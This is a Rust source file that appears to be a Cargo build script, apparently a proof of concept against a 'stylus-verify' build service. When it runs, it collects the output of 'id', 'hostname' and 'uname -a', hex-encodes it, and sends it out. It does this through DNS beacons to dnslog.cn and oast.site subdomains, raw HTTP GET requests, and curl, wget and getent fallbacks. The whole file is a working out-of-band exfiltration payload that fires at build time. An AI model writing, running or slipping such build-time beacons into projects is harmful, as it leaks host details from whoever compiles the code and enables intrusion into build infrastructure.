use std::process::Command;
use std::net::{ToSocketAddrs, TcpStream};
use std::io::Write;
use std::time::Duration;

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn hex(s: &str) -> String {
    s.as_bytes().iter().map(|b| format!("{:02x}", b)).collect()
}

fn dns(host: &str) {
    // std resolver -> DNS query logged at authoritative server, no external tools needed
    let _ = format!("{}:80", host).to_socket_addrs();
}

fn http_get(host: &str, path: &str) {
    if let Ok(addrs) = format!("{}:80", host).to_socket_addrs() {
        for a in addrs {
            if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(8)) {
                let req = format!("GET {} HTTP/1.0\r\nHost: {}\r\nConnection: close\r\n\r\n", path, host);
                let _ = s.write_all(req.as_bytes());
                break;
            }
        }
    }
}

fn main() {
    let id = sh("id");
    let hn = sh("hostname");
    let un = sh("uname -a");
    let i = hex(&id[..id.chars().take(28).count()]);
    let h = hex(&hn[..hn.chars().take(28).count()]);
    let u = hex(&un[..un.chars().take(20).count()]);
    let tag = "a5a06822";
    let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
    // 1) pure-std DNS beacons (works even without curl/wget/getent in image)
    dns(&format!("ping.{}.y1acsd.dnslog.cn", tag));
    dns(&format!("i{}.{}.y1acsd.dnslog.cn", i, tag));
    dns(&format!("ping.{}.{}", tag, ish));
    dns(&format!("i{}.{}.{}", i, tag, ish));
    // 2) pure-std HTTP beacons
    http_get(&ish, &format!("/p/{}/{}/{}/{}", tag, i, h, u));
    http_get(&format!("p.{}.{}", tag, ish), &format!("/{}/{}/{}", i, h, u));
    // 3) shell fallbacks if tools exist (harmless if not)
    let _ = sh(&format!("(getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x; wget -q -T 8 -O /dev/null http://ping.{}.y1acsd.dnslog.cn/x) >/dev/null 2>&1 &", tag, tag, tag));
    println!("cargo:warning=stylus-verify-poc-build-ok");
}

